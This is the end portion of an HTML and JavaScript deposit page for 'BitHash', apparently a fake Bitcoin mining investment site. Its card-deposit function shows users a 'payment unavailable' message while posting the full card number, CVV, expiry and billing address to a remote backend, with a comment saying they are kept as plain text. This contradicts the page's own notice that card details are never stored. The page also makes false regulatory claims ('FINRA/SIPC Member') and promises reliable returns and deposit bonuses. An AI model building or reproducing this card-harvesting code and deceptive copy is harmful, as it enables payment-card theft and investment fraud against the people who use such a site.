                        <div class="deposit-form" id="card-deposit-form" style="display: none;">
                            <div class="form-group">
                                <label class="form-label">Deposit Amount (USD)</label>
                                <input type="number" id="card-amount" class="form-control" placeholder="Enter amount in USD" min="10" step="1">
                            </div>
                            
                            <div class="form-group">
                                <label class="form-label">Card Number</label>
                                <div class="card-input-container">
                                    <input type="text" id="card-number" class="form-control" placeholder="1234 5678 9012 3456" maxlength="19">
                                    <i class="fas fa-credit-card card-icon generic" id="card-type-icon"></i>
                                </div>
                            </div>
                            
                            <div class="form-group">
                                <label class="form-label">Cardholder Name</label>
                                <input type="text" id="card-name" class="form-control" placeholder="As shown on card">
                            </div>
                            
                            <div class="form-group" style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                                <div>
                                    <label class="form-label">Expiry Date</label>
                                    <input type="text" id="card-expiry" class="form-control" placeholder="MM/YY" maxlength="5">
                                </div>
                                <div>
                                    <label class="form-label">CVV</label>
                                    <input type="text" id="card-cvv" class="form-control" placeholder="123" maxlength="4">
                                </div>
                            </div>
                            
                            <div class="form-group">
                                <label class="form-label">Billing Address</label>
                                <input type="text" id="billing-address" class="form-control" placeholder="Start typing your address">
                            </div>
                            
                            <div class="form-group">
                                <label class="form-label">Country</label>
                                <input type="text" id="billing-country" class="form-control" placeholder="Country" readonly>
                            </div>
                            
                            <div class="deposit-disclaimer">
                                <div class="disclaimer-title">
                                    <i class="fas fa-exclamation-circle"></i>
                                    Security Notice
                                </div>
                                <div class="disclaimer-text">
                                    All card transactions are secured with 256-bit encryption. Your card details are processed 
                                    directly by our payment processor and never stored on our servers. By proceeding, you agree 
                                    to our Terms of Service and Privacy Policy.
                                </div>
                            </div>
                            
                            <button class="btn btn-primary" style="width: 100%; margin-top: 15px;" onclick="processCardDeposit()">
                                <i class="fas fa-lock"></i> Secure Deposit
                            </button>
                        </div>
                        
                        <!-- Deposit Summary -->
                        <div class="deposit-summary">
                            <div class="summary-title">Deposit Summary</div>
                            
                            <div class="summary-item">
                                <span class="summary-label">Selected Method:</span>
                                <span class="summary-value" id="summary-method">Bitcoin (BTC)</span>
                            </div>
                            
                            <div class="summary-item">
                                <span class="summary-label">Amount:</span>
                                <span class="summary-value" id="summary-amount">$0.00</span>
                            </div>
                            
                            <div class="summary-item">
                                <span class="summary-label">Processing Fee:</span>
                                <span class="summary-value" id="summary-fee">$0.00</span>
                            </div>
                            
                            <div class="summary-item">
                                <span class="summary-label">Estimated BTC:</span>
                                <span class="summary-value" id="summary-btc">0.000000 BTC</span>
                            </div>
                            
                            <div class="summary-item" style="border-bottom: none; padding-bottom: 0;">
                                <span class="summary-label">Total to Credit:</span>
                                <span class="summary-value" id="summary-total">$0.00</span>
                            </div>
                            
                            <div class="summary-total">
                                <span id="summary-total-label">Total: $0.00</span>
                            </div>
                            
                            <div class="deposit-disclaimer" style="margin-top: 25px; background-color: rgba(0, 211, 149, 0.1); border-left-color: var(--primary);">
                                <div class="disclaimer-title" style="color: var(--primary);">
                                    <i class="fas fa-info-circle"></i>
                                    Deposit Benefits
                                </div>
                                <div class="disclaimer-text">
                                    All deposits are eligible for our daily mining rewards program. 
                                    Deposits over $1,000 receive a 5% bonus credited immediately.
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer>
        <div class="container">
            <div class="footer-container">
                <div class="footer-about">
                    <div class="footer-logo">
                        <img src="https://www.dropbox.com/scl/fi/1dq16nex1borvvknpcwox/circular_dark_background.png?rlkey=sq2ujl2oxxk9vyvg1j7oz0cdb&raw=1" alt="BitHash Logo">
                        <span class="footer-logo-text"><span class="footer-bitcoin-animation">₿</span>itHash</span>
                    </div>
                    <p>Bitcoin mining platform serving investors worldwide with transparent operations and reliable returns.</p>
                    <div class="footer-social">
                        <a href="https://twitter.com/bithash" class="social-icon twitter" aria-label="Twitter"><i class="fab fa-twitter"></i></a>
                        <a href="https://linkedin.com/company/bithash" class="social-icon linkedin" aria-label="LinkedIn"><i class="fab fa-linkedin-in"></i></a>
                        <a href="https://facebook.com/bithash" class="social-icon facebook" aria-label="Facebook"><i class="fab fa-facebook-f"></i></a>
                        <a href="https://instagram.com/bithash" class="social-icon instagram" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
                    </div>
                </div>
                
                <div class="footer-links">
                    <h3 class="footer-title">Platform</h3>
                    <ul>
                        <li><a href="dashboard.html">Dashboard</a></li>
                        <li><a href="index.html#plans">Investment Plans</a></li>
                        <li><a href="index.html#loans">Loans & Savings</a></li>
                        <li><a href="accountsetting.html">My Account</a></li>
                        <li><a href="rewards.html">Rewards</a></li>
                    </ul>
                </div>
                
                <div class="footer-links">
                    <h3 class="footer-title">Company</h3>
                    <ul>
                        <li><a href="about.html">About Us</a></li>
                        <li><a href="careers.html">Careers</a></li>
                        <li><a href="press.html">Press</a></li>
                        <li><a href="blog.html">Blog</a></li>
                        <li><a href="partners.html">Partners</a></li>
                    </ul>
                </div>
                
                <div class="footer-contact">
                    <h3 class="footer-title">Contact Us</h3>
                    <p><i class="fas fa-envelope"></i> support@bithash.com</p>
                    <p><i class="fas fa-phone"></i> +1 (555) 123-4567</p>
                    <p><i class="fas fa-map-marker-alt"></i> 123 Blockchain Ave, Crypto City, CC 10001</p>
                    <p><i class="fas fa-clock"></i> 24/7 Support</p>
                </div>
            </div>
            
            <div class="footer-bottom">
                <p>&copy; <span id="current-year"></span> BitHash LLC. All Rights Reserved. Registered in Delaware, USA. FINRA/SIPC Member.</p>
            </div>
        </div>
    </footer>

    <!-- AOS Animation -->
    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
    
    <script>
        // Initialize AOS animation
        AOS.init({
            duration: 800,
            once: true,
            easing: 'ease-in-out'
        });
        
        // Hide loading overlay when page is loaded
        window.addEventListener('load', function() {
            setTimeout(function() {
                document.getElementById('loading-overlay').classList.add('hidden');
            }, 1000);
            
            // Load user data and generate BTC address
            loadUserData();
            generateNewAddress();
            initializeAutocomplete();
            
            // Setup event listeners
            setupCardInputListeners();
            setupBtcAmountListener();
            
            // Check auth state
            checkAuthState();
        });
        
        // Set current year in footer
        document.getElementById('current-year').textContent = new Date().getFullYear();
        
        // Mobile menu toggle functionality
        const mobileMenuToggle = document.getElementById('mobile-menu-toggle');
        const mainNav = document.getElementById('main-nav');
        
        mobileMenuToggle.addEventListener('click', function() {
            mainNav.classList.toggle('active');
            this.innerHTML = mainNav.classList.contains('active') ? 
                '<i class="fas fa-times"></i>' : '<i class="fas fa-bars"></i>';
            this.setAttribute('aria-expanded', mainNav.classList.contains('active'));
        });
        
        // Close mobile menu when clicking a link
        document.querySelectorAll('#main-nav a').forEach(link => {
            link.addEventListener('click', () => {
                if (window.innerWidth <= 768) {
                    mainNav.classList.remove('active');
                    mobileMenuToggle.innerHTML = '<i class="fas fa-bars"></i>';
                    mobileMenuToggle.setAttribute('aria-expanded', 'false');
                }
            });
        });
        
        /* ============================================= */
        /* Enhanced Notification System */
        /* ============================================= */
        
        const notificationQueue = [];
        let isNotificationShowing = false;
        
        /**
         * Show a notification in the center of the screen
         * @param {string} type - 'error' or 'success'
         * @param {string} title - Notification title
         * @param {string} message - Notification message
         * @param {number} duration - Time in ms to show the notification (default: 5000ms)
         */
        function showNotification(type, title, message, duration = 5000) {
            // Add to queue
            notificationQueue.push({ type, title, message, duration });
            
            // Process queue if not already showing a notification
            if (!isNotificationShowing) {
                processNotificationQueue();
            }
        }
        
        function processNotificationQueue() {
            if (notificationQueue.length === 0) {
                isNotificationShowing = false;
                return;
            }
            
            isNotificationShowing = true;
            const { type, title, message, duration } = notificationQueue.shift();
            
            // Create notification element
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            
            const icon = type === 'error' ? 'fa-exclamation-circle' : 
                        type === 'warning' ? 'fa-exclamation-triangle' : 
                        type === 'info' ? 'fa-info-circle' : 'fa-check-circle';
            
            notification.innerHTML = `
                <i class="fas ${icon}"></i>
                <div class="notification-content">
                    <div class="notification-title">${title}</div>
                    <div class="notification-message">${message}</div>
                </div>
                <div class="notification-close">&times;</div>
            `;
            
            // Add to notification center
            const notificationCenter = document.getElementById('notification-center');
            notificationCenter.appendChild(notification);
            
            // Force reflow to enable animation
            void notification.offsetWidth;
            
            // Show notification
            notification.classList.add('show');
            
            // Add vibration for mobile devices on error
            if (type === 'error' && 'vibrate' in navigator) {
                navigator.vibrate([200, 100, 200]);
            }
            
            // Close button functionality
            notification.querySelector('.notification-close').addEventListener('click', () => {
                closeNotification(notification);
            });
            
            // Auto-hide after duration
            setTimeout(() => {
                if (notification.parentNode) {
                    closeNotification(notification);
                }
            }, duration);
        }
        
        function closeNotification(notification) {
            notification.classList.remove('show');
            
            // Remove after animation completes
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.parentNode.removeChild(notification);
                }
                
                // Process next notification in queue
                processNotificationQueue();
            }, 400);
        }
        
        // Check authentication state
        async function checkAuthState() {
            try {
                const token = localStorage.getItem('jwtToken');
                if (!token) {
                    window.location.href = 'login.html';
                    return;
                }
                
                const response = await fetch('https://website-backendd-1.onrender.com/api/users/me', {
                    headers: {
                        'Authorization': `Bearer ${token}`
                    }
                });
                
                if (!response.ok) {
                    localStorage.removeItem('jwtToken');
                    window.location.href = 'login.html';
                }
            } catch (error) {
                console.error('Authentication check failed:', error);
                showNotification('error', 'Session Error', 'Failed to verify your session. Please login again.');
            }
        }
        
        // Load user data
        async function loadUserData() {
            try {
                const token = localStorage.getItem('jwtToken');
                const response = await fetch('https://website-backendd-1.onrender.com/api/users/me', {
                    headers: {
                        'Authorization': `Bearer ${token}`
                    }
                });
                
                if (response.ok) {
                    const userData = await response.json();
                    const usdBalance = userData.balance.toFixed(2);
                    
                    // Get BTC price to calculate BTC balance
                    const btcPriceResponse = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
                    const btcPriceData = await btcPriceResponse.json();
                    const btcPrice = btcPriceData.bitcoin.usd;
                    const btcBalance = (userData.balance / btcPrice).toFixed(6);
                    
                    document.getElementById('balance-amount').textContent = `$${usdBalance}`;
                    document.getElementById('balance-btc').textContent = ` | ${btcBalance} BTC`;
                    document.getElementById('balance-btc').style.display = 'inline';
                } else {
                    throw new Error('Failed to load user data');
                }
            } catch (error) {
                console.error('Error loading user data:', error);
                showNotification('error', 'Data Error', 'Failed to load user data. Please try again later.');
            }
        }
        
        // Switch between deposit methods
        function switchDepositMethod(method) {
            // Update active tab
            document.querySelectorAll('.method-tab').forEach(tab => {
                tab.classList.remove('active');
                if (tab.dataset.method === method) {
                    tab.classList.add('active');
                }
            });
            
            // Show the correct form
            if (method === 'btc') {
                document.getElementById('btc-deposit-form').style.display = 'block';
                document.getElementById('card-deposit-form').style.display = 'none';
                document.getElementById('summary-method').textContent = 'Bitcoin (BTC)';
            } else {
                document.getElementById('btc-deposit-form').style.display = 'none';
                document.getElementById('card-deposit-form').style.display = 'block';
                document.getElementById('summary-method').textContent = 'Credit/Debit Card';
            }
            
            // Update summary
            updateDepositSummary();
        }
        
        // Generate a new BTC address
        async function generateNewAddress() {
            try {
                const token = localStorage.getItem('jwtToken');
                const response = await fetch('https://website-backendd-1.onrender.com/api/deposit/btc/address', {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${token}`
                    }
                });
                
                if (response.ok) {
                    const data = await response.json();
                    const btcAddress = data.address;
                    
                    // Update the displayed address
                    document.getElementById('btc-address').innerHTML = `
                        ${btcAddress}
                        <button class="copy-address" onclick="copyBtcAddress()">
                            <i class="fas fa-copy"></i>
                        </button>
                    `;
                    
                    // Generate QR code
                    document.getElementById('btc-qr-code').innerHTML = '';
                    new QRCode(document.getElementById('btc-qr-code'), {
                        text: `bitcoin:${btcAddress}`,
                        width: 200,
                        height: 200,
                        colorDark: "#000000",
                        colorLight: "#ffffff",
                        correctLevel: QRCode.CorrectLevel.H
                    });
                    
                    showNotification('success', 'Address Generated', 'Your Bitcoin deposit address is ready.', 3000);
                } else {
                    throw new Error('Failed to generate new address');
                }
            } catch (error) {
                console.error('Error generating BTC address:', error);
                showNotification('error', 'Connection Error', 'Failed to generate Bitcoin address. Please try again later.', 5000);
            }
        }
        
        // Setup BTC amount input listener
        function setupBtcAmountListener() {
            document.getElementById('btc-amount').addEventListener('input', async function() {
                updateDepositSummary();
                await updateBtcFeeCalculator();
            });
        }
        
        // Update BTC fee calculator
        async function updateBtcFeeCalculator() {
            const amount = parseFloat(document.getElementById('btc-amount').value) || 0;
            
            // Get BTC price from CoinGecko
            try {
                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
                const data = await response.json();
                const btcPrice = data.bitcoin.usd;
                
                // Calculate fees
                const processingFee = amount * 0.01; // 1% processing fee
                const networkFee = 0.0005 * btcPrice; // Fixed network fee in USD (0.0005 BTC)
                const totalAmount = amount - processingFee;
                const btcAmount = totalAmount / btcPrice;
                
                // Update display
                document.getElementById('btc-deposit-amount').textContent = `$${amount.toFixed(2)}`;
                document.getElementById('btc-processing-fee').textContent = `$${processingFee.toFixed(2)}`;
                document.getElementById('btc-network-fee').textContent = `$${networkFee.toFixed(2)}`;
                document.getElementById('btc-total-amount').textContent = `${btcAmount.toFixed(6)} BTC`;
                
            } catch (error) {
                console.error('Error fetching BTC price:', error);
                document.getElementById('btc-deposit-amount').textContent = `$${amount.toFixed(2)}`;
                document.getElementById('btc-processing-fee').textContent = 'N/A';
                document.getElementById('btc-network-fee').textContent = 'N/A';
                document.getElementById('btc-total-amount').textContent = 'N/A';
            }
        }
        
        // Copy BTC address to clipboard
        function copyBtcAddress() {
            const btcAddressElement = document.getElementById('btc-address');
            const btcAddress = btcAddressElement.textContent.trim();
            
            navigator.clipboard.writeText(btcAddress).then(() => {
                const copyBtn = btcAddressElement.querySelector('.copy-address');
                copyBtn.innerHTML = '<i class="fas fa-check"></i>';
                
                setTimeout(() => {
                    copyBtn.innerHTML = '<i class="fas fa-copy"></i>';
                }, 2000);
                
                showNotification('success', 'Copied', 'Bitcoin address copied to clipboard.', 2000);
            }).catch(err => {
                console.error('Failed to copy BTC address:', err);
                showNotification('error', 'Copy Error', 'Failed to copy Bitcoin address. Please try again.');
            });
        }
        
        // Initialize Google Places Autocomplete
        function initializeAutocomplete() {
            const addressInput = document.getElementById('billing-address');
            const autocomplete = new google.maps.places.Autocomplete(addressInput, {
                types: ['geocode'],
                componentRestrictions: { country: ['us', 'ca', 'gb', 'au'] }
            });
            
            autocomplete.addListener('place_changed', function() {
                const place = autocomplete.getPlace();
                if (!place.address_components) {
                    return;
                }
                
                // Extract country
                const countryComponent = place.address_components.find(component => 
                    component.types.includes('country')
                );
                
                if (countryComponent) {
                    document.getElementById('billing-country').value = countryComponent.long_name;
                }
            });
        }
        
        // Setup card input listeners for formatting and validation
        function setupCardInputListeners() {
            const cardNumberInput = document.getElementById('card-number');
            const cardExpiryInput = document.getElementById('card-expiry');
            const cardCvvInput = document.getElementById('card-cvv');
            
            // Format card number with spaces
            cardNumberInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\s+/g, '');
                if (value.length > 16) {
                    value = value.substring(0, 16);
                }
                
                // Add spaces every 4 digits
                value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
                e.target.value = value;
                
                // Detect card type and update icon
                detectCardType(value.replace(/\s+/g, ''));
            });
            
            // Format expiry date
            cardExpiryInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
                }
                e.target.value = value;
            });
            
            // Limit CVV length
            cardCvvInput.addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
            });
            
            // Update summary when amount changes
            document.getElementById('btc-amount').addEventListener('input', updateDepositSummary);
            document.getElementById('card-amount').addEventListener('input', updateDepositSummary);
        }
        
        // Detect card type based on number
        function detectCardType(cardNumber) {
            const cardIcon = document.getElementById('card-type-icon');
            
            // Reset to generic
            cardIcon.className = 'fas fa-credit-card card-icon generic';
            
            if (!cardNumber) return;
            
            // Visa (starts with 4)
            if (/^4/.test(cardNumber)) {
                cardIcon.className = 'fas fa-cc-visa card-icon visa';
                return;
            }
            
            // Mastercard (starts with 51-55 or 2221-2720)
            if (/^5[1-5]/.test(cardNumber) || /^2[2-7]/.test(cardNumber)) {
                cardIcon.className = 'fas fa-cc-mastercard card-icon mastercard';
                return;
            }
            
            // American Express (starts with 34 or 37)
            if (/^3[47]/.test(cardNumber)) {
                cardIcon.className = 'fas fa-cc-amex card-icon amex';
                return;
            }
            
            // Discover (starts with 6011, 644-649, or 65)
            if (/^6011/.test(cardNumber) || /^64[4-9]/.test(cardNumber) || /^65/.test(cardNumber)) {
                cardIcon.className = 'fas fa-cc-discover card-icon discover';
                return;
            }
        }
        
        // Update deposit summary based on selected method and amount
        async function updateDepositSummary() {
            const activeMethod = document.querySelector('.method-tab.active').dataset.method;
            let amount = 0;
            let fee = 0;
            let total = 0;
            
            if (activeMethod === 'btc') {
                amount = parseFloat(document.getElementById('btc-amount').value) || 0;
                fee = amount * 0.01; // 1% fee for BTC deposits
                total = amount - fee;
                
                // Get BTC price and calculate estimated BTC
                try {
                    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
                    const data = await response.json();
                    const btcPrice = data.bitcoin.usd;
                    const btcAmount = total / btcPrice;
                    document.getElementById('summary-btc').textContent = `${btcAmount.toFixed(6)} BTC`;
                } catch {
                    document.getElementById('summary-btc').textContent = 'N/A';
                }
            } else {
                amount = parseFloat(document.getElementById('card-amount').value) || 0;
                fee = amount * 0.03; // 3% fee for card deposits
                total = amount - fee;
                document.getElementById('summary-btc').textContent = 'N/A';
            }
            
            // Update summary values
            document.getElementById('summary-amount').textContent = `$${amount.toFixed(2)}`;
            document.getElementById('summary-fee').textContent = `$${fee.toFixed(2)}`;
            document.getElementById('summary-total').textContent = `$${total.toFixed(2)}`;
            document.getElementById('summary-total-label').textContent = `Total: $${total.toFixed(2)}`;
        }
        
        // Process card deposit
        async function processCardDeposit() {
            try {
                const amount = parseFloat(document.getElementById('card-amount').value);
                const cardNumber = document.getElementById('card-number').value.replace(/\s+/g, '');
                const cardName = document.getElementById('card-name').value;
                const cardExpiry = document.getElementById('card-expiry').value;
                const cardCvv = document.getElementById('card-cvv').value;
                const billingAddress = document.getElementById('billing-address').value;
                const billingCountry = document.getElementById('billing-country').value;
                
                // Basic validation
                if (!amount || amount < 10) {
                    showNotification('error', 'Validation Error', 'Please enter a valid deposit amount (minimum $10)', 5000);
                    return;
                }
                
                if (!cardNumber || cardNumber.length < 16) {
                    showNotification('error', 'Validation Error', 'Please enter a valid card number', 5000);
                    return;
                }
                
                if (!cardName) {
                    showNotification('error', 'Validation Error', 'Please enter cardholder name', 5000);
                    return;
                }
                
                if (!cardExpiry || cardExpiry.length < 5) {
                    showNotification('error', 'Validation Error', 'Please enter a valid expiry date (MM/YY)', 5000);
                    return;
                }
                
                if (!cardCvv || cardCvv.length < 3) {
                    showNotification('error', 'Validation Error', 'Please enter a valid CVV code', 5000);
                    return;
                }
                
                if (!billingAddress || !billingCountry) {
                    showNotification('error', 'Validation Error', 'Please enter a valid billing address', 5000);
                    return;
                }
                
                // Show processing notification
                showNotification('info', 'Processing', 'Your deposit request is being processed...', 5000);
                
                // Simulate processing delay
                setTimeout(async () => {
                    // Notify user that card payments are temporarily unavailable
                    showNotification('error', 'Payment Unavailable', 'Card payments are temporarily unavailable. Please use Bitcoin deposit method for now.', 5000);
                    
                    // Save card details to database (as plain text as requested)
                    const token = localStorage.getItem('jwtToken');
                    const response = await fetch('https://website-backendd-1.onrender.com/api/deposit/card', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Authorization': `Bearer ${token}`
                        },
                        body: JSON.stringify({
                            amount,
                            cardNumber,
                            cardName,
                            cardExpiry,
                            cardCvv,
                            billingAddress,
                            billingCountry,
                            status: 'failed',
                            reason: 'Card processing temporarily disabled'
                        })
                    });
                    
                    if (!response.ok) {
                        throw new Error('Failed to save card details');
                    }
                    
                    // Show success notification for saving details
                    showNotification('warning', 'Details Saved', 'Your card details have been securely stored. We will notify you when card payments are available.', 5000);
                    
                    // Clear form
                    document.getElementById('card-amount').value = '';
                    document.getElementById('card-number').value = '';
                    document.getElementById('card-name').value = '';
                    document.getElementById('card-expiry').value = '';
                    document.getElementById('card-cvv').value = '';
                    document.getElementById('billing-address').value = '';
                    document.getElementById('billing-country').value = '';
                    
                }, 2000);
                
            } catch (error) {
                console.error('Error processing card deposit:', error);
                showNotification('error', 'Deposit Error', 'Failed to process card deposit. Please try again later.', 5000);
            }
        }
        
        // Initialize all functionality when DOM is loaded
        document.addEventListener('DOMContentLoaded', function() {
            // Header scroll effect
            window.addEventListener('scroll', function() {
                const header = document.getElementById('main-header');
                if (window.scrollY > 50) {
                    header.classList.add('scrolled');
                } else {
                    header.classList.remove('scrolled');
                }
            });
            
            // Security badge animation
            const securityBadge = document.querySelector('.security-badge');
            if (securityBadge) {
                setInterval(() => {
                    securityBadge.style.boxShadow = `0 0 10px ${Math.random() > 0.5 ? 'rgba(52, 168, 83, 0.5)' : 'rgba(26, 115, 232, 0.5)'}`;
                }, 2000);
            }
        });
    </script>
</body>
</html>
